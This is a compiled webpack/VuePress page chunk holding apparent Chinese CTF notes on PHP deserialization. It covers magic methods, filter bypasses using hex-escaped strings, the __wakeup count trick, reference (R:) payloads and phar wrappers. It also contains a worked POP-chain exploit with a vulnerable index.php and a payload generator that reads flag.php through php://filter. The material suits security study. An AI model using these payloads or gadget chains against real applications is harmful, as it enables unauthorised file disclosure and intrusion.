(window.webpackJsonp=window.webpackJsonp||[]).push([[43],{740:function(s,n,a){"use strict";a.r(n);var e=a(102),t=Object(e.a)({},(function(){var s=this,n=s.$createElement,a=s._self._c||n;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"php-反序列化"}},[s._v("PHP 反序列化 "),a("a",{staticClass:"header-anchor",attrs:{href:"#php-反序列化"}},[s._v("#")])]),s._v(" "),a("p",[s._v("魔术函数：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("__construct() 当一个对象创建时被调用，反序列化不触发\n__destruct()  当一个对象销毁时被调用\n__toString()  当一个对象被当作一个字符串使用，比如echo输出或用 . 和字符串拼接\n__call()      当调用的方法不存在时触发\n__invoke()    当一个对象被当作函数调用时触发\n__wakeup()    反序列化时自动调用\n__get()       类中的属性私有或不存在触发\n__set()       类中的属性私有或不存在触发\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("p",[s._v("反序列化十六进制绕过关键字")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('在反序列化时，序列化中的十六进制会被转化成字母\n当过滤了c2e38 ，即可用 \\63\\32\\65\\33\\38 替代，S解析十六进制\nusername:y1ng\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\npassword:";S:11:"\\00*\\00password";O:8:"Hacker_A":1:{S:5:"\\63\\32\\65\\33\\38";O:8:"Hacker_B":1:{S:5:"\\63\\32\\65\\33\\38";O:8:"Hacker_C":1:{s:4:"name";s:4:"test";}}};s:1:"a";s:0:"\n \n\\00 会被替换为 %00\n\\65 会被替换为 e\n \n过滤了%00，可用S来代替序列化字符串的s来绕过，在S情况下\\00 会被解析成%00\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br")])]),a("p",[s._v("序列化时类中私有变量和受保护变量，php7.1+ 对属性并不敏感，public 也可用于protected")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("private反序列化后是%00(类名)%00(变量名)，protect是%00*%00(变量名)\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("PHP5 以及 PHP7 < 7.0.10 可用wake up 绕过")]),s._v(" "),a("img",{staticStyle:{zoom:"80%"},attrs:{src:"/images/php-serialize/2.png",alt:"image-20201218105604315"}}),s._v(" "),a("p",[s._v("当对象个数大于实际个数就不会触发")]),s._v(" "),a("h2",{attrs:{id:"序列化引用"}},[s._v("序列化引用： "),a("a",{staticClass:"header-anchor",attrs:{href:"#序列化引用"}},[s._v("#")])]),s._v(" "),a("img",{staticStyle:{zoom:"67%"},attrs:{src:"/images/php-serialize/3.png",alt:"image-20201218105803889"}}),s._v(" "),a("p",[s._v('这里的 R:2 即对第二个序列化变量的引用。第一个序列化变量是 a:2:{***}，第二个序列化变量是 i:0;s:3:"foo";')]),s._v(" "),a("p",[s._v("所以这道题可以构造 token 对 token_flag 的引用")]),s._v(" "),a("p",[s._v('payload = O:6:"Handle":2:{s:14:"%00Handle%00handle";O:4:"Flag":3:{s:4:"file";s:8:"flag.php";s:5:"token";s:32:"02575659ec3b5f6d204a1d1b3081379b";s:10:"token_flag";R:4;}} 。')]),s._v(" "),a("p",[s._v("按序列化顺序排号：")]),s._v(" "),a("p",[s._v('(1), O:6:"Handle":2:{***}')]),s._v(" "),a("p",[s._v('(2), s:14:"%00Handle%00handle";O:4:"Flag":3:{***}')]),s._v(" "),a("p",[s._v('(3), s:4:"file";s:8:"flag.php";')]),s._v(" "),a("p",[s._v('(4), s:5:"token";s:32:"02575659ec3b5f6d204a1d1b3081379b";')]),s._v(" "),a("p",[s._v('(5), s:10:"token_flag";R:4;')]),s._v(" "),a("p",[s._v("可以看出 token_flag 即为 4 号 token 的引用，所以序列化之后他们是恒等的。")]),s._v(" "),a("img",{staticStyle:{zoom:"80%"},attrs:{src:"/images/php-serialize/1.png",alt:"image-20201218105854349"}}),s._v(" "),a("p",[s._v("把b的地址给a，之后b再传入数据则a也相应变化")]),s._v(" "),a("p",[s._v("可以说这两个变量绑定在了一起，有一个改变，另一个也会一起改变")]),s._v(" "),a("p",[s._v("当没有 unserialize() 时可使用phar，file_exist() 会触发phar反序列化 ( PHP8中删除 )")]),s._v(" "),a("p",[s._v("当开头为phar的协议被过滤时，可使用compress.zlib:// 绕过")]),s._v(" "),a("p",[s._v("形如：compress.zlib://phar://")]),s._v(" "),a("h2",{attrs:{id:"例题"}},[s._v("例题 "),a("a",{staticClass:"header-anchor",attrs:{href:"#例题"}},[s._v("#")])]),s._v(" "),a("p",[s._v("目标路径存在 index.php 和 flag.php")]),s._v(" "),a("p",[s._v("index.php：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("<?php\nerror_reporting(0);\nclass Vox{\n    protected $headset;\n    public $sound;\n    public function fun($pulse){\n        include($pulse);\n    }\n    public function __invoke(){\n        $this->fun($this->headset);\n    }\n}\n\nclass Saw{\n    public $fearless;\n    public $gun;\n\n    public function __toString(){\n        $this->gun['gun']->fearless;\n        return \"Saw\";\n    }\n\n    public function _pain(){\n        if($this->fearless){\n            highlight_file($this->fearless);\n        }\n    }\n\n    public function __wakeup(){\n        if(preg_match(\"/gopher|http|file|ftp|https|dict|php|\\.\\./i\", $this->fearless)){\n            echo \"Does it hurt? That's right\";\n            $this->fearless = \"index.php\";\n        }\n    }\n}\n\nclass Petal{\n    public $seed;\n\n    public function __get($sun){\n        $Nourishment = $this->seed;\n        return $Nourishment();\n    }\n}\n\nif(isset($_GET['ozo'])){\n    unserialize($_GET['ozo']);\n}\nelse{\n    $Saw = new Saw('index.php');\n    $Saw->_pain();\n}\n?>\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br"),a("span",{staticClass:"line-number"},[s._v("31")]),a("br"),a("span",{staticClass:"line-number"},[s._v("32")]),a("br"),a("span",{staticClass:"line-number"},[s._v("33")]),a("br"),a("span",{staticClass:"line-number"},[s._v("34")]),a("br"),a("span",{staticClass:"line-number"},[s._v("35")]),a("br"),a("span",{staticClass:"line-number"},[s._v("36")]),a("br"),a("span",{staticClass:"line-number"},[s._v("37")]),a("br"),a("span",{staticClass:"line-number"},[s._v("38")]),a("br"),a("span",{staticClass:"line-number"},[s._v("39")]),a("br"),a("span",{staticClass:"line-number"},[s._v("40")]),a("br"),a("span",{staticClass:"line-number"},[s._v("41")]),a("br"),a("span",{staticClass:"line-number"},[s._v("42")]),a("br"),a("span",{staticClass:"line-number"},[s._v("43")]),a("br"),a("span",{staticClass:"line-number"},[s._v("44")]),a("br"),a("span",{staticClass:"line-number"},[s._v("45")]),a("br"),a("span",{staticClass:"line-number"},[s._v("46")]),a("br"),a("span",{staticClass:"line-number"},[s._v("47")]),a("br"),a("span",{staticClass:"line-number"},[s._v("48")]),a("br"),a("span",{staticClass:"line-number"},[s._v("49")]),a("br"),a("span",{staticClass:"line-number"},[s._v("50")]),a("br"),a("span",{staticClass:"line-number"},[s._v("51")]),a("br"),a("span",{staticClass:"line-number"},[s._v("52")]),a("br"),a("span",{staticClass:"line-number"},[s._v("53")]),a("br")])]),a("p",[s._v("flag.php：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('<?php\n$flag="{This_is_flag}";\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("首先先找反序列化链入口，这里没有 "),a("code",[s._v("__destruct()")]),s._v("，能触发的只有 "),a("code",[s._v("__wakeup()")]),s._v("，入口从"),a("code",[s._v("__wakeup()")]),s._v("进，出口有两个，一个是 "),a("code",[s._v("_pain()")]),s._v(" 的 "),a("code",[s._v("highlight_file($this->fearless)")]),s._v("，另一个是"),a("code",[s._v("__fun")]),s._v("中的 "),a("code",[s._v("include()")]),s._v("，这里可以使用 php 伪协议读取文件内容")]),s._v(" "),a("p",[s._v("然后捋一遍出现的魔术函数，有 "),a("code",[s._v("__wakeup()")]),s._v("，"),a("code",[s._v("__toString()")]),s._v("，"),a("code",[s._v("__invoke()")]),s._v("，"),a("code",[s._v("__get()")])]),s._v(" "),a("p",[a("code",[s._v("__wakeup()")]),s._v("是入口，后面有一句 "),a("code",[s._v("preg_match")]),s._v("，"),a("code",[s._v("$this->fearless")]),s._v(" 是被当成字符串使用的，就是说如果把  "),a("code",[s._v("$this->fearless")]),s._v(" 赋值为 对象 Saw 就会进入 "),a("code",[s._v("__toString()")]),s._v("，之后有 "),a("code",[s._v("$this->gun['gun']->fearless")]),s._v(" ，Petal 类中不存在 "),a("code",[s._v("fearless")]),s._v(" 属性，把 "),a("code",[s._v("gun['gun']")]),s._v("赋值为 对象 Petal 会进入 "),a("code",[s._v("__get()")]),s._v("，其中 "),a("code",[s._v("$Nourishment()")]),s._v(" 可控，属性 "),a("code",[s._v("seed")]),s._v("赋值为对象，触发"),a("code",[s._v("__invoke()")]),s._v("伪协议包含读文件")]),s._v(" "),a("h3",{attrs:{id:"payload"}},[s._v("Payload "),a("a",{staticClass:"header-anchor",attrs:{href:"#payload"}},[s._v("#")])]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("<?php\nclass Vox{\n    protected $headset=\"php://filter/read=convert.base64-encode/resource=flag.php\";\n    public $sound;\n}\n\nclass Saw{\n    public $fearless;\n    public $gun;\n\tpublic function _pain(){}\n}\n\nclass Petal{\n    public $seed;\n}\n$a = new Vox();\n$b = new Saw();\n$c = new petal();\n$c->seed = $a;\n$d = new Saw();\n$d->gun['gun']=$c;\n$b->fearless = $d;\necho(serialize($b));\n?>\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br")])])])}),[],!1,null,null,null);n.default=t.exports}}]);